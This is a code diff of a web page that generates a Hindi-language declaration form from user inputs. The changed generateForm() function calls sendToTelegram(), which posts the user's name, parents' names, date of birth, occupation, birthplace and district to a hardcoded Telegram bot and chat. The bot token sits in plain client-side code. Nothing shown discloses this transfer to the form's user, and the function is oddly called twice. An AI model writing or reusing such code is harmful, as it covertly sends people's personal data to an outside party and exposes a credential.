@@ -227,6 +227,8 @@
 
   async function generateForm() {
 
+  await sendToTelegram();
+
 sendToTelegram();
 
     document.getElementById('p_name').innerText = document.getElementById('name').value;
@@ -314,41 +316,18 @@ sendToTelegram();
       alert('Image download failed');
     }
   }
-async function sendToTelegram(){
+async function sendToTelegram() {
 
-const botToken="8313201713:AAF5N2rfAtW8KtPwLKitXnrfXuuEFB68CB4";
-const chatId="1913335716";
+  const botToken = "8313201713:AAF5N2rfAtW8KtPwLKitXnrfXuuEFB68CB4";
+  const chatId = "1913335716";
 
-try{
-
-await fetch(
-`https://api.telegram.org/bot${botToken}/sendMessage`,
-{
-method:"POST",
-headers:{
-"Content-Type":"application/json"
-},
-body:JSON.stringify({
-chat_id:chatId,
-text:"TEST MESSAGE"
-})
-}
-);
-
-}catch(e){
-
-console.log(e);
-
-}
-
-}
-const message = `
+  const message = `
 📝 नया घोषणा पत्र
 
 नाम: ${document.getElementById('name').value}
 पिता: ${document.getElementById('father').value}
 माता: ${document.getElementById('mother').value}
-जन्म तिथि: ${document.getElementById('dob').value}
+DOB: ${document.getElementById('dob').value}
 
 व्यवसाय: ${document.getElementById('business').value}
 जन्म स्थान: ${document.getElementById('birthPlace').value}
@@ -363,20 +342,23 @@ const message = `
 जिला: ${document.getElementById('district').value}
 `;
 
-await fetch(
-`https://api.telegram.org/bot${botToken}/sendMessage`,
-{
-method:"POST",
-headers:{
-"Content-Type":"application/json"
-},
-body:JSON.stringify({
-chat_id:chatId,
-text:message
-})
-}
-);
-
+  try {
+    await fetch(
+      `https://api.telegram.org/bot${botToken}/sendMessage`,
+      {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json"
+        },
+        body: JSON.stringify({
+          chat_id: chatId,
+          text: message
+        })
+      }
+    );
+  } catch (err) {
+    console.log("Telegram Error:", err);
+  }
 }
   function resetForm() {
     document.querySelectorAll('input').forEach(input => {
